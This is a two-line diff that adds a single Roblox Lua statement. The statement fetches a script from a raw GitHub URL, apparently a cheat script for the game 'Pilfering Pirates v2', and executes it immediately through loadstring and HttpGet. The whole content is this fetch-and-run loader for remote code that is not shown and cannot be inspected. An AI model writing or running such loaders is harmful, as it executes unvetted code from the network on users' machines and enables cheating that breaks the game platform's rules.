@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2btrleans/scr1ipt/refs/heads/main/pilfering%20pirates%20v2.txt"))()
